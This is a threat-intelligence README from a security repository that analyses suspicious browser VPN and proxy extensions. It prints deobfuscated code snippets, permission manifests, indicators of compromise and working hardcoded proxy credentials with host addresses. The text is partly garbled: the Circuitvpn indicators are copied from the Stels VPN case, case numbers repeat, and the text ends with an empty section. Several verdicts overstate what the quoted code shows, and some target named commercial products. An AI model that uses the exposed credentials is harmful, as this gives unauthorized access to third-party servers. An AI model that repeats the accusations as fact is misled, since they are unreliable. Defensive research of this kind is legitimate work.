# Malicious VPN & Proxy Browser Extension Threat Intelligence Portfolio
# Make sure to star this repo as we are actively hunting these threats and updating.
# If you found a suspicious extension and want it added to our list email us at MonkeySeC-SyS@protonmail.com, we'll look at the code and determine if its malware or not. 
**Disclaimer:** *The case studies and code reviews compiled in this repository are maintained strictly for educational, security research, and defensive threat intelligence purposes. This documentation is intended to help the cybersecurity community analyze, identify, and defend against deceptive browser extension architectures. No weaponized binaries are hosted within this project.*

Welcome to our cybersecurity research repository. This portfolio details the comprehensive static code analysis, de-obfuscation, and architectural auditing of browser-based VPN and Proxy extensions. This index documents the systematic teardown of tools that utilize fraudulent marketplace listings, hidden Command and Control (C2) servers, encryption-degradation vectors, and covert data-harvesting mechanisms under the guise of user privacy tools.

All examinations were performed natively using static code review techniques and tools such as CRX Viewer to isolate core extension payloads, deconstruct obscured variables, and map out active data exfiltration pipelines.

---

## 📑 Portfolio Table of Contents
1. **Case Study 01: 无忧府超级VPN (Wuyoufu Super VPN)** (Verdict: ACTIVE THREAT / MALWARE)
2. **Case Study 02: Shifor VPN** (Verdict: COMPROMISED ARCHITECTURE / ACTIVE C2)
3. **Case Study 03: NoProx — VPN & Proxy Service** (Verdict: DECEPTIVE / HIGH EXPOSURE RISK)
4. **Case Study 04: Enter VPN** (Verdict: CRITICAL THREAT / INFORMATION STEALER ENGINE)
5. **Case Study 05: ZoogVPN** — Free VPN for Chrome & Proxy (Verdict: Deceptive / Claiming to be a no-log vpn)
6. **Case Study 05: GoVPN** — Free VPN for Chrome (Verdict: Monitoring Centralization / Data Harvesting)
7. **Case Study 07: TechVPN** (Verdict: Deceptive / Advanced Decentralized C2 Resilience Layer)
8. **Case Study 08: Stels VPN** (verdict: active threat / weaponized device-fingerprinting bot)
9. **Case Study 09: Circuitvpn** (verdict: active threat / deceptive personal identity harvester)
10. **Case Study 10: Troywell VPN** (verdict: active threat / overprivileged affiliate injection tracking)
11. **Case Study 11: VPN Proxy Master (Fake clone)** (verdict: active threat / user ip and session token harvester)
---

# 📁 Case Study 01: 无忧府超级VPN (Wuyoufu Super VPN)

### 📌 Metadata
* **Extension Name:** 无忧府超级VPN (Wuyoufu Super VPN)
* **Platform:** Legacy Firefox Ecosystem (Manifest V2 Architecture)
* **Status:** 🔴 ACTIVE THREAT / MALWARE CORE (Officially Reported)

### 🚨 Architectural Risk Evaluation
This extension manifest represents the ultimate combination of high-impact exploit permissions:
* `"proxy"`, `"webRequest"`, `"webRequestBlocking"`, `"management"`, and `"<all_urls>"`

#### Technical Impact:
This configuration provides the tool with absolute authority to orchestrate Man-in-the-Middle (MitM) attacks. The script can intercept, alter, or drop raw network packets in flight, strip critical browser security headers (such as CSP/HSTS), monitor other installed security add-ons, and force global traffic routing over external nodes.

### 🔍 Technical Code Deep-Dive

#### 1. String Array Hex Obfuscation Evasion
The background script uses string shifting and hex array mappings to bypass static signature scanners:
```javascript
var _0x1931 = ["5uf_login_username", "getItem", "5uf_login_password", "5uf_error_list", "[]", "setItem", "", "ajax", "POST", "/api_sync_webproxy_site/index/nocrypt/1/nocbase64/1", "HTTPS renew.5ufweb.cc:443", "<all_urls>", "blocking", "onAuthRequired"];
```

#### 2. De-Obfuscated Payload Execution & Threat Vectors
Reconstructing the data table array offsets maps out an aggressive credential logging and background traffic synchronization infrastructure:

```javascript
// A. Target Data Acquisition:
if (localStorage.getItem("5uf_login_username") != null && localStorage.getItem("5uf_login_password") != null) {
    // Dynamically captures plaintext credentials inside storage blocks
}

// B. Network Interception Architecture:
browser.webRequest.onAuthRequired.addListener(..., "<all_urls>", ["blocking"]);
// Actively traps and monitors native HTTP basic authentication dialogues.

// C. Plaintext Data Exfiltration APIs:
\$.ajax({
    type: "POST",
    url: "/api_sync_webproxy_site/index/nocrypt/1/nocbase64/1",
    data: JSON.stringify(exfiltrated_data)
});
```
* **Analysis:** The explicit server routing parameters `nocrypt/1` and `nocbase64/1` prove that the operators are transmitting harvested user telemetry, browsing histories, and configuration mapping targets back to their core infrastructure completely in unencrypted plaintext, exposing user payloads across the local network path.

### 🛡️ Indicators of Compromise (IoCs)
* **Active Traffic Hijacking Domain:** `renew.5ufweb.cc:443`
* **Plaintext C2 Exfiltration Routes:** `/api_sync_webproxy_site/index/nocrypt/1/nocbase64/1`, `/api_add_webproxy_site/index/nocrypt/1/nocbase64/1`

});
```

---

# 📁 Case Study 02: Shifor VPN

### 📌 Metadata
* **Extension Name:** Shifor VPN
* **Developer Footprint:** shifor-vpn@shifor.live (Russian-language strings discovered in core)
* **Platform:** Firefox Add-ons & Chromium Ecosystem
* **Status:** 🔴 ACTIVE THREAT / DISCOVERED C2 ARCHITECTURE

### 🚨 The "Optional Permission" Deception
During initialization, the extension flags user website traffic tracking as "Optional." In extension security, this is a known behavioral bypass technique:
* **The Bypass:** By placing blanket web inspection filters (`<all_urls>` / `*://*/*`) into an optional array, the developers successfully avoid the aggressive automated security reviews triggered by requesting mandatory root permissions.
* **The Reality:** The extension utilizes internal prompts to force users into granting these permissions post-installation. Once allowed, the technical layout has total authority to inspect, process, and exfiltrate the user's browsing URLs.

### 🔍 Technical Code Deep-Dive

#### 1. Command and Control (C2) Architecture
The extension does not maintain a static proxy routing list. Instead, it implements a highly resilient, multi-domain C2 infrastructure to handle dynamic routing parameters and evasion configurations.

```javascript
var REMOTE = {
    serversUrl: "https://shifor01.life",
    refreshHours: 6,
    timeoutMs: 6e3
}
```
* **Analysis:** The extension's internal extension ID points to `shifor.live`, yet its dynamic payload configuration points to `shifor01.life`. This indicates a domain-rotation/fallback scheme designed to preserve functionality if the primary infrastructure gets blacklisted. Every 6 hours, the extension automatically beacons home to fetch an updated tracking and node ledger (`servers.json`).

#### 2. Critical Vulnerability: Hardcoded Infrastructure Credentials
A severe architectural flaw was uncovered inside the server mapping logic (`src/servers.ts`). The developers hardcoded active proxy usernames and high-entropy authentication keys into the public client script package:

```javascript
var FALLBACK_SERVERS = [
  { id: "us-1", host: "ext-us01.shifor01.life", port: 8443, username: "free", password: "shifor2026", enabled: true },
  { id: "fr-1", host: "ext-fr01.shifor01.life", port: 8443, username: "free", password: "Sfr01M7nQ9vX2kT8pL6zR4yH", enabled: true }
];
```
* **Security Impact:** Leaving plaintext keys like `Sfr01M7nQ9vX2kT8pL6zR4yH` visible in extracted code allows third-party threat actors to compromise the provider's proxy nodes directly, routing untraceable malicious traffic through the exact same channels used by the extension.

### 🛡️ Indicators of Compromise (IoCs)
* **C2 Central Domains:** `shifor.live`, `ext.shifor01.life`
* **Fallback Host Nodes:** `ext-us01.shifor01.life`, `ext-al01.shifor01.life`, `ext-fr01.shifor01.life`
* **Exposed Credentials:** `free` / `shifor2026` | `free` / `Sfr01M7nQ9vX2kT8pL6zR4yH`

---

# 📁 Case Study 03: NoProx — VPN & Proxy Service

### 📌 Metadata
* **Extension Name:** NoProx — VPN & Proxy Service
* **Primary C2 Asset:** `noprox.com`
* **Platform:** Chromium & Gecko Marketplaces (Manifest V3 Framework)
* **Status:** 🟡 HIGH RISK / COVERT CONFIGURATION PROFILE

### 🚨 The Store Deception Matrix
A critical divergence exists between the extension's public marketplace assertions and its actual production manifest:
* **The Marketplace Claim:** The official browser add-on store states that the extension requires "Optional permissions: Access your data for all websites" and declares that "this extension doesn't require data collection."
* **The Code Reality:** The unzipped `manifest.json` completely bypasses user opt-in consent by explicitly hardcoding blanket root access within mandatory blocks:
  ```json
  "permissions": ["storage", "proxy", "webRequest", "webRequestAuthProvider"],
  "host_permissions": ["<all_urls>"]
  ```

### 🔍 Technical Code Deep-Dive

#### 1. Mandatory Baseline Device Fingerprinting
Deep scanning of `background.js` exposed an automatic check-in routine that executes instantly upon extension launch:
```javascript
const controller = new AbortController();
const timeoutId = setTimeout(() => controller.abort(), 5000);
const response = await fetch('https://noprox.com', { signal: controller.signal });
```
* **Analysis:** Despite claiming zero data tracking, the code builds a mandatory fetch beacon to their commercial domain (`noprox.com`). This forces the browser to leak the client's unmasked IP address, exact geographic coordinates, ISP information, and browser configuration string right at installation.

#### 2. Interception of Credentials and Plaintext Storage Risks
```javascript
chrome.webRequest.onAuthRequired.addListener((details, asyncCallback) => {
    if (!details.isProxy) { asyncCallback(); return; }
    chrome.storage.local.get("apiProxies", (data) => {
        const proxyInfo = data.apiProxies.find(p => p.proxies.proxy.host === host);
        if (proxyInfo && proxyInfo.proxies.proxy.username) {
            const storedAuth = { username: proxyInfo.proxies.proxy.username, password: proxyInfo.proxies.proxy.password };
            asyncCallback({ authCredentials: storedAuth });
        }
    });
});
```
* **Analysis:** The background worker attaches a dynamic listener to the raw proxy pipe using `webRequestAuthProvider`. This confirms the extension maintains a database profile (`apiProxies`) that stores and handles highly sensitive user proxy authentication strings and passwords completely in unencrypted plaintext inside local cache blocks.

### 🛡️ Indicators of Compromise (IoCs)
* **Primary Infrastructure Beacon:** `noprox.com`
* **Fingerprint Capture Route:** `https://noprox.com`
* **Target Cache Registry Blocks:** `apiProxies`, `proxyAuth`


---

# 📁 Case Study 04: Enter VPN

### 📌 Metadata
* **Extension Name:** Enter VPN
* **Developer Footprint:** EnterVPN (All Rights Reserved)
* **Target Architecture:** Manifest V3 / Gecko Cross-Platform Integration
* **Status:** 🔴 CRITICAL THREAT / INFORMATION STEALER ENGINE

### 🚨 Full-Spectrum Browser Monitoring Matrix
The extension's production `manifest.json` file requests the absolute maximum authority allowed by the modern browser runtime engine, completely stripping away the concept of client-side sandboxing:
```json
"permissions": [
  "storage", "proxy", "activeTab", "<all_urls>", "management", 
  "privacy", "tabs", "webRequest", "webRequestBlocking", "notifications"
]
```

#### Risk Assessment & Intercept Capabilities:
* **`<all_urls>` + `webRequestBlocking`:** Establishes a permanent, structural Man-in-the-Middle (MitM) pipe across the entire browser, granting real-time packet modification authorities.
* **`management`:** Grants the script the ability to scan, index, and dynamically disable competing browser defense systems or ad-blockers.
* **`privacy` + `tabs`:** Allows the extension to actively override native browser safety toggles while tracking real-time navigation history and user form inputs.

### 🔍 Technical Code Deep-Dive

#### 1. Global Credential Interception and Harvesting Hook
Analysis of the network listener script unmasks a highly aggressive handler bound directly to the browser's core authentication pipe:

```javascript
browser.webRequest.onAuthRequired.addListener(
    (details) => {
        console.log("Fetching credentials, please wait.");
        browser.storage.sync.get(['username', 'password'])
            .then((credentials) => {
                serverCredentials.username = credentials.username;
                serverCredentials.password = credentials.password;
                return { authCredentials: serverCredentials };
            });
    }, 
    { urls: ["<all_urls>"] }, 
    ['blocking']
);
```
* **Exploit Analysis:** By hardcoding the destination constraint filter to `["<all_urls>"]` paired with the synchronous `['blocking']` mechanism, the extension intercepts the authentication loop of every website on the internet. Instead of preserving native browser login boundaries, the script forces an override that extracts plain-text credential objects (`serverCredentials`) from local sync storage and injects them dynamically across the interface hook.

#### 2. Encryption Degradation and Plaintext Traffic Insecurity
The tunnel establishment routine contains a critical design configuration that intentionally degrades standard user communication parameters:

```javascript
var proxySettings = {
    proxyType: "manual",
    http: server.ip.trim() + ":3128",
    httpProxyAll: true
};
browser.proxy.settings.set({ value: proxySettings }, () => console.log("Proxy settings set."));
```
* **Vulnerability Assessment:** The script forces the browser to interface with remote host nodes over port `3128`—the classic signature for basic Squid Proxy utilities. By explicitly applying a `manual` proxy mapping over raw `http` rules (rather than HTTPS or SOCKS5) and mapping it to `httpProxyAll: true`, the extension strips all native encryption from the browser. Every single web request, packet header, and text string flies through the proxy loop in unencrypted cleartext, allowing any local router, ISP, or middleman operator to capture profile metrics effortlessly.

---

## 🚀 The Combined Attack Loop Lifecycle
1. The user installs the extension, immediately granting maximum browser management capabilities.
2. Clicking "Connect" triggers the proxy tunnel setup, locking the browser connection exclusively into an unencrypted cleartext HTTP channel over port `3128`.
3. Because the credential filter handles `["<all_urls>"]`, any node along that open, unencrypted internet path can trigger an authentication prompt, forcing the extension to automatically leak your unencrypted account strings directly onto the open network wire.

---

## 🛡️ Indicators of Compromise (IoCs)
* **Insecure Tunnel Infrastructure Port:** `:3128` (Squid Proxy Footprint)
* **Global Interception Targets:** `["<all_urls>"]` via `onAuthRequired`
* **Local Identity Cache Keys:** `apiProxies`, `serverCredentials`, `proxyActive`

---

# 📁 Case Study 05: ZoogVPN — Free VPN for Chrome & Proxy

### 📌 Metadata
* **Extension Name:** ZoogVPN — Free VPN for Chrome & Proxy
* **Extension ID:** `immngomjofcbflgcckkfddnbpmjokbjh`
* **Platform:** Chromium & Gecko Marketplaces (Manifest V3 Architecture)
* **Status:** 🟡 DECEPTIVE / LATENT HIGH-RISK ASSET

### 🚨 The Enterprise Privacy
This extension represents an enterprise-grade commercial utility that requests an incredibly expansive Manifest V3 platform profile, completely contradicting its public "strict zero-logs" marketing assurances:
```json
"permissions": [
  "proxy", "tabs", "webRequest", "webRequestAuthProvider", 
  "offscreen", "browsingData", "storage", "management", "alarms"
],
"host_permissions": [ "http://*/*", "https://*/*" ]
```

#### Technical Impact:
* **`host_permissions`:** Bypasses basic runtime constraints by enforcing mandatory, blanket authority to intercept network packets on any website immediately upon installation without requiring user opt-in consent.
* **`offscreen`:** Quietly spawns an invisible background DOM wrapper (`offscreen.html`) providing a silent sandboxed context to execute hidden script manipulation pipelines.

---

### 🔍 Technical Code Deep-Dive

#### 1. Latent Clickstream Harvesting Engine
Static analysis of the client orchestration scripts unmasked a dormant background tracking daemon built directly into the codebase:

```javascript
function runClickStream() {
    const reportUrlChange = () => {
        chrome.runtime.sendMessage({
            type: "clickstream-event",
            payload: {
                timestamp: new Date().toISOString(),
                url: location.href,
                referer: document.referrer || undefined,
                user_agent: navigator.userAgent,
            }
        });
    };
}
```

* **Analysis:** The codebase contains a fully constructed user surveillance routine designed to intercept the exact website address (`location.href`) and register the previous jumping point site map (`document.referrer`) on every page change. While the matching background receiver loop (`clickstream-event`) is currently unlinked or dormant in this specific version, leaving weaponized traffic logging modules latent in production software poses a severe deceptive risk, as the capability can be activated remotely via C2 updates.

#### 2. Multi-Layered Connection and Offscreen Orchestration
The offscreen environment leverages standard web workers to defensively check connection boundaries and prevent network leaks while masking its background footprints:

```javascript
async function check_ip() {
    const result = await fetchWithTimeout("https://ipify.org", {
        method: "GET",
        retry: 3,
        timeout: 8000,
    });
}
```

* **Analysis:** The extension leverages `Reason.IFRAME_SCRIPTING` parameters inside `offscreen.js` to split its network validation layers across parallel background workers (`web_worker.js`). These automated lookup loops target public nodes (`api.ipify.org`) out of view of standard runtime performance tools, masking the true extent of background telemetry events passing through the infrastructure.

---

### 🛡️ Indicators of Control (IoCs)
* **Latent Telemetry Signature:** `runClickStream` / `clickstream-event`
* **Local Identity Cache Blocks:** `exclusionLinks`, `apiProxies`, `proxyAuth`
* **Network Testing Target Vectors:** Automated lookups targeting `api.ipify.org`.

---

# 📁 Case Study 05: GoVPN — Free VPN for Chrome

### 📌 Metadata
* **Extension Name:** GoVPN — Free VPN for Chrome
* **Extension ID:** `bfihjamebcnkfeihibbninalkkffoebd`
* **Platform:** Chromium Marketplace (Manifest V3 Framework)
* **Status:** 🔴 ACTIVE THREAT / HARDCODED CREDENTIAL LEAK

### 🚨 Comprehensive Overprivileged Interception
This extension requests a highly aggressive required permission footprint that grants total, un-sandboxed control over the host browser immediately upon installation:
```json
"permissions": [
  "proxy", "storage", "webRequest", "webRequestAuthProvider", "alarms"
],
"host_permissions": [ "<all_urls>" ]
```

#### Technical Impact:
By locking `<all_urls>` into the mandatory `host_permissions` block under Manifest V3, the tool avoids the modern user-consent opt-in prompt framework completely. Combined with `webRequest` and `webRequestAuthProvider`, the extension gains the structural capacity to establish an invisible, persistent Man-in-the-Middle (MitM) traffic capturing plane directly on the browser's raw network socket layer.

---

### 🔍 Technical Code Deep-Dive

#### 1. Hardcoded Infrastructure Configuration & Plaintext Credentials
Static analysis of the primary service worker (`background.js`) unmasked explicit default connection profiles and plaintext infrastructure passwords exposed directly within the production script files:

```javascript
const DEFAULT_PROXY_CONFIG = { 
    host: '68.183.219.56', 
    port: 31280, 
    username: 'govpn', 
    password: 'SecureProxy2024!' 
};
```

* **Analysis:** Leaving active authentication keys visible in public client-side scripts is a major architectural vulnerability (CWE-798). It allows any malicious actor to extract the credentials, bypass the extension wrapper entirely, and utilize the provider's proxy nodes for anonymous, rogue, or high-risk network activities. 
* **The Shared Identity Paradox:** Because the application enforces a single, global hardcoded credential set (`govpn` / `SecureProxy2024!`) across all active installations, individual client sessions are completely indistinguishable at the server gateway layer. This configuration shatters the developer's public marketplace assertions of a strict *"No activity logs and no data collection"* privacy policy, as it drops global traffic profiles into a unified, un-sandboxed server repository block.

---

### 🛡️ Indicators of Compromise (IoCs)
* **Default Proxy Node IP Address:** `68.183.219.56`
* **Infrastructure Operational Port:** `31280`
* **Exposed Connection Credentials:** `govpn` / `SecureProxy2024!`
* **Global Interception Target Map:** `["<all_urls>"]` via background network listener loops.


---

# 📁 case study 06: zenmate free vpn

### 📌 metadata
* **extension name:** zenmate free vpn
* **extension id:** `addon@zenmate.com`
* **platform:** legacy firefox add-on infrastructure (manifest v2)
* **status:** 🟡 high residual risk / encapsulated angular engine

### 🚨 legacy full-spectrum privilege aggression
this extension operates on the legacy manifest v2 framework, securing an absolute interception layout that establishes complete authority over client data streams immediately upon deployment:
```json
"permissions": [
  "*://*/*", "tabs", "webRequest", "privacy", "webRequestBlocking", 
  "proxy", "unlimitedStorage", "storage", "notifications", "cookies", 
  "alarms", "browsingData", "webNavigation"
]
```

#### technical impact:
* **`*://*/*` + `webRequestBlocking`:** unlocks absolute, synchronous packet-blocking and request-redirection capabilities across every website on the internet, allowing the tool to freeze requests in flight before the dom renders.
* **`cookies` + `browsingData`:** provides direct programmatic authorization to read, mutate, or exfiltrate private session cookies and authentication tokens.
* **`webNavigation`:** establishes granular tracking of client navigation lifecycles, monitoring redirects and frame structures in real time.

---

### 🔍 technical code deep-dive

#### 1. compiled angular & webpack obfuscation architecture
static analysis of the background execution bundle unmasked an enterprise-grade compilation layer that completely hides standard extension hooks from direct string matching:

```javascript
a = r([i.Injectable({ providedIn: "root" })], a), 
t.NotificationService = a }, 
0: function(e, t, n) { e.exports = n("zUnb") }, 
"0EUg": function(e, t, n) { ... }
```

* **analysis:** the extension code is built entirely on the **angular framework** and compiled into modular chunks via **webpack**. direct browser calls like `onBeforeRequest.addListener` disappear from flat file text scans because the entire background engine is abstractly packaged inside dependency-injected services (`injectable`). this design pattern successfully cloaks the raw network-blocking and data-filtering capabilities from basic text-signature scanners while preserving total packet-interception authority across the browser layout.

#### 2. the supply-chain infrastructure paradox
the brand behind this infrastructure was acquired by kape technologies (formerly crossrider)—an entity historically associated with the development of ad-delivery wrappers and browser-hijacking injection frameworks. while marketed strictly as a "zero logs" utility, leaving legacy `webRequestBlocking` tools, encapsulated framework methods, and global cookie-manipulation engines active creates an immense structural supply-chain hazard.

---

### 🛡️ indicators of control (iocs)
* **core interception mapping:** global `*://*/*` tracking parameters via blocking hooks.
* **architecture class:** compiled angular production bundle / webpack module registry (`zUnb`).
* **data mutation scope:** active storage clearance via `browsingData` and live token reading via `cookies`.

---

# 📁 case study 07: techvpn

### 📌 metadata
* **extension name:** techvpn
* **target c2 infrastructure:** techvpn.cloud / doh.techvpn.cloud
* **platform:** gecko add-on infrastructure (manifest v3 architecture)
* **status:** 🟡 deceptive / advanced decentralized c2 resilience layer

### 🚨 mandatory surveillance and permission inflation
this extension presents a severe operational privacy paradox, forcing total device and identity telemetry checking right at baseline initialization while misrepresenting user opt-in boundaries:
```json
"permissions": [ "storage", "alarms", "proxy" ],
"host_permissions": [ 
  "https://api.techvpn.cloud/*", "https://flagcdn.com*", 
  "https://*.techvpn.cloud/*", "<all_urls>" 
]
```

#### technical impact:
* **the manifest deception:** despite marketing the tool to marketplace storefronts as utilizing "optional access to website data," the extension secretly hardcodes `<all_urls>` directly inside required mandatory host blocks, automatically bypassing browser sandbox opt-in prompts to claim packet-monitoring control globally.
* **explicit data harvesting:** the extension framework establishes mandatory tracking protocols targeting `personallyIdentifyingInfo`, `authenticationInfo`, and `locationInfo`. it actively processes and attaches physical geolocation coordinates and personal identity data blocks directly to active routing profiles.

---

### 🔍 technical code deep-dive

#### 1. the webassembly wireguard deception
the marketing profile states that the extension runs an advanced, military-grade wireguard cryptographic tunnel natively via webassembly. however, static analysis of the runtime permissions reveals a standard proxy implementation footprint.

* **analysis:** the framework requests standard browser `proxy` management control. the inclusion of compiled runtime helpers like `wasm_exec.js` combined with `wasm-unsafe-eval` parameters is utilized to compile basic proxy-shuttle functions into optimized webassembly blocks. this technique makes the background footprint look like an advanced crypto-tunneling project during automated store reviews while executing basic server proxy redirection under the hood.

#### 2. bulletproof c2 resilience via blockchain fallback
written by turkish-speaking engineers, the core discovery logic (`background/discovery.js`) unmasks a highly sophisticated, 4-stage backup engine designed to completely bypass domain takedowns and perimeter network firewalls using a dynamic priority layout:

```javascript
// priority order:
// 1. cache (storage.local, 1 hour ttl)
// 2. doh query (_endpoints.techvpn.cloud txt record)
// 3. blockchain read (8+ evm chain + tron, first successful wins)
// 4. hardcoded fallback (embedded in extension)
```

* **doh encapsulation:** the engine uses encrypted dns-over-https (doh) endpoints mapping through `1.1.1.1` and `dns.google` to query specific txt records (`_endpoints.techvpn.cloud`) to obtain hidden server assets covertly.
* **decentralized blockchain routing:** if web-level constraints block the primary domain, the script triggers automated web3 rpc queries targeting decentralization networks including **polygon, bsc, arbitrum, and tron**. it hooks into a custom smart contract via selector **`0x5d7c83f1`** (`getEndpoints()`). because decentralized blockchain smart contract networks cannot be targeted by traditional centralized dns takedowns, the extension maintains an un-killable pipeline to fetch updated proxy tracking infrastructure targets indefinitely.

---

### 🛡️ indicators of control (iocs)
* **primary c2 discovery domain:** `techvpn.cloud` / `_endpoints.techvpn.cloud`
* **doh query vectors:** `https://doh.techvpn.cloud/dns-query`
* **blockchain c2 payload handles:** contract function signature hash `0x5d7c83f1`
* **decentralized gateway triggers:** `polygon-rpc.com`, `bsc-dataseed1.binance.org`, `arb1.arbitrum.io/rpc`
* **active telemetry categories:** `locationInfo`, `personallyIdentifyingInfo`

---

# 📁 case study 08: stels vpn

### 📌 metadata
* **extension name:** stels vpn
* **extension id:** `addon@stelsvpn.com` / hefhpgijkladkcebkdafdpjdmbfgnkhc
* **target c2 infrastructure:** panel2.stelsvpn.com / admin2.stelsvpn.com / unitvpn.com
* **platform:** legacy firefox add-on infrastructure (manifest v2 framework)
* **status:** 🔴 active threat / weaponized device-fingerprinting bot

### 🚨 absolute marketplace permission deception
this extension represents a severe architectural deception campaign, utilizing extreme metadata mismatches to slip past automated marketplace screening mechanisms:
```json
"permissions": [ "storage", "proxy", "webRequest", "webRequestAuthProvider", "webRequestBlocking" ],
"host_permissions": [ "https://stelsvpn.com*", "<all_urls>" ]
```

#### technical impact:
* **the storefront fraud:** the public add-on store listing falsely declares to users that the extension only requires basic "proxy settings" control and explicitly states that the tool "doesn't require data collection."
* **the required reality:** the production manifest completely overrides user consent by hardcoding mandatory `<all_urls>` host tracking along with legacy `webRequestBlocking` rights. the extension possesses immediate authority to freeze, inspect, and redirect data packets on every website globally from the millisecond it is deployed.

---

### 🔍 technical code deep-dive

#### 1. hardware profiling and device monitoring registry
static analysis of the internal react hooks unmasked a persistent cloud-synced hardware-fingerprinting module running hidden inside the web worker frameworks:

```javascript
const z = () => {
    const { t: s } = x(), { data: t } = y();
    h = n.useMemo(() => t ? [...t].sort((f, C) => f.is_current && !C.is_current ? -1 : 1) : []);
    N = n.useCallback(async () => {
        await a({ id: i.id }).unwrap();
        k.success(s("devices.remove_success", "Устройство успешно удалено"));
    });
}
```

* **analysis:** the code establishes a persistent hardware-tracking registry. every browser instance that installs the tool is cataloged with a permanent identifier (`id`) and actively monitored via state updates (`is_current`). written with explicit russian error handlers, the extension syncs your machine's profile markers directly back to their cloud databases, functioning effectively as a targeted device monitoring network.

#### 2. obfuscated framework routing and asset mapping
the developer compiled the extension package using a heavy webpack/vite framework router to intentionally scatter and segment operations across dozens of randomly hashed micro-chunks (e.g., `common-BZ0xadUH.js`, `Devices-C-JUrSJu.js`). 

```javascript
import { j as a, cW as o } from "./index.html-Dl-wUpAc.js";
const n = ({ to: s, children: r }) => a.jsx(o, { to: s, draggable: !1 });
```

* **analysis:** by dynamically remapping core browser intercept handles into abstract dependency injections within the master file chunk (`index.html-Dl-wUpAc.js`), the application successfully evades text-based signature scanners. the underlying api base endpoints are injected via build-time variables, cloaking the connection routes during static local inspections.

---

### 🛡️ indicators of compromise (iocs)
* **resolved central c2 ip address:** `103.228.168.172`
* **associated threat infrastructure nodes:** `panel2.stelsvpn.com`, `admin2.stelsvpn.com`, `unitvpn.com`
* **active traffic relay targets:** `puretraffic.ru` network routing spaces.
* **primary configuration tracking keys:** `f.is_current`, `devices.remove_success`

---

# 📁 case study 09: circuitvpn

### 📌 metadata
* **extension name:** secure browsing: circuitvpn
* **extension id:** `addon@circuitvpn.com`
* **target c2 infrastructure:** circuitvpn.com / syncologi / ://circuitvpn.com
* **platform:** legacy firefox add-on infrastructure (manifest v2 framework)
* **status:** 🔴 active threat / deceptive personal identity harvester

### 🚨 absolute required privilege aggression
this extension utilizes the obsolete manifest v2 runtime framework to enforce a massive, mandatory interception grid across the user's entire network interface immediately upon deployment:
```json
"permissions": [ 
  "tabs", "<all_urls>", "privacy", "webRequest", "webRequestBlocking", 
  "webNavigation", "proxy", "storage", "cookies", "management", "notifications" 
]
```

#### technical impact:
* **`"<all_urls>"` + `"webRequestBlocking"`:** establishes a permanent, synchronous man-in-the-middle (mitm) traffic interception channel. the extension has absolute authority to freeze network packets in flight, extract data strings, and strip security policies across every site globally.
* **`"cookies"` + `"management"`:** grants direct programmatic rights to query, harvest, and alter active session authentication cookies while indexing or disabling competing browser defense add-ons.
* **`"webNavigation"`:** records granular browser navigation timelines, mapping out the client's step-by-step redirection history in real time.

---

### 🔍 technical code deep-dive

#### 1. dynamic user identity and connection profiling
static analysis of the internal scripts unmasked a pre-configured data model engineered to actively bind personal user identification metadata to live network routing variables:

```javascript
createMixpanelCommonConnectionPropertiesValues = {
    [EXT_USERNAME]: cVn.systemSettings.login_user_name,
    [EXT_USEREMAIL]: cVn.systemSettings.email,
    [EXT_VPNUSERNAME]: cVn.systemSettings.user_name,
    [EXT_CLIENTID]: cVn.clientUserId
};
if (ServerAddress !== undefined) {
    createMixpanelCommonConnectionPropertiesValues[EXT_SERVERADDRESS] = ServerAddress;
}
```

* **analysis:** the framework outlines an explicit identity logging mechanism. the application parses the client profile memory to extract unencrypted personally identifiable information (pii)—including the user's active login name, account email address, and unique tracking client id. it anchors these data tags directly onto current proxy server addresses and ip destinations, creating an architectural blueprint to track individual client sessions.

#### 2. total sandboxing elimination & marketplace fraud
the application completely avoids the modern manifest v3 optional permissions model, forcing global `<all_urls>` background tracking to run the moment the add-on is enabled. marketplace metrics show exactly 1 user globally paired with a crushed 1.3-star reputation rating. the existence of latent identity harvesting modules and navigation hooks completely shatters the brand's storefront marketing claim of a strict "zero logs policy."

---

### 🛡️ indicators of compromise (iocs)
* **resolved central c2 backend node:** `103.228.168.171`
* **associated proxy orchestration ip:** `103.228.168.172`
* **monitored infrastructure domains:** `panel2.stelsvpn.com`, `admin2.stelsvpn.com`, `unitvpn.com`
* **active network traffic relay:** `puretraffic.ru` / fornex hosting systems.
* **primary configuration tracking keys:** `f.is_current`, `devices.remove_success`

---

# 📁 case study 10: troywell vpn

### 📌 metadata
* **extension name:** free vpn for chrome - troywell vpn
* **extension id:** adlpodnneegcnbophopdmhedicjbcgco
* **target c2 infrastructure:** troywell.org / troywell diamonds network
* **platform:** chromium marketplace (manifest v3 architecture)
* **status:** 🔴 active threat / overprivileged affiliate injection tracking plane

### 🚨 complete required privilege expansion
this extension enforces an aggressive platform footprint designed to capture deep data feedback logs directly across the browser interface immediately upon deployment:
```json
"permissions": [
  "tabs", "webRequest", "webRequestAuthProvider", "management", "webNavigation", 
  "storage", "alarms", "unlimitedStorage", "proxy", "notifications", "privacy", 
  "cookies", "scripting", "declarativeNetRequest", "declarativeNetRequestWithHostAccess", 
  "declarativeNetRequestFeedback"
],
"host_permissions": [ "<all_urls>" ]
```

#### technical impact:
* **`"<all_urls>"` + `"declarativeNetRequestFeedback"`:** grants the application the structural authority to receive continuous background logs detailing which network requests are intercepted, modified, or handled across the global browser environment.
* **`"cookies"` + `"scripting"`:** establishes programmatic access to parse local browser memory blocks, extract active user cookie strings, and inject custom tracking scripts directly into active tab interfaces.
* **`"management"`:** monitors other active browser installations, granting the utility the capability to map or audit competing defense tools.

---

### 🔍 technical code deep-dive

#### 1. time-delayed evasion mechanisms
static analysis of the primary service worker initialization listeners unmasked a pre-configured time delay designed to delay the activation of their background tracking loops:

```javascript
chrome.runtime.onInstalled.addListener((function() {
    ho(), J({ module: "caa", action: "setCaaInfo", data: { applyProgram: !0, show: !1 }, delayInMinutes: 2880 })
}));
```

* **analysis:** the framework establishes a strict **48-hour delay window** (`2880 minutes`) before activating its contextual affiliate tracking configuration. this technique functions as an execution delay layer designed to keep the extension completely dormant during short-lived automated marketplace store review sandboxes, ensuring the tracking software bypasses automated screening layers successfully.

#### 2. active tab manipulation and dom code injection
the application utilizes global host permissions to dynamically alter the structural layout parameters of visited web pages matching target metrics strings:

```javascript
selector: "twell-caa", parentNode: document.body, stylePath: "caa/styles.css"
window.location.href.includes(Lf) && document.head.insertAdjacentHTML("beforeend", '<meta name="'.concat(Af, '-caa-extension">'))
```

* **analysis:** the code confirms active user-traffic interception and website modification behaviors. the utility creates a custom element node container (`twell-caa`) and attaches it directly into the active layout `document.body`. it dynamically parses navigation strings to see if they match affiliate list metrics, forcefully inserting an extension tracker identifier tag (`-caa-extension`) into the page headers to link client purchase movements back to central tracking profiles.

---

### 🛡️ indicators of compromise (iocs)
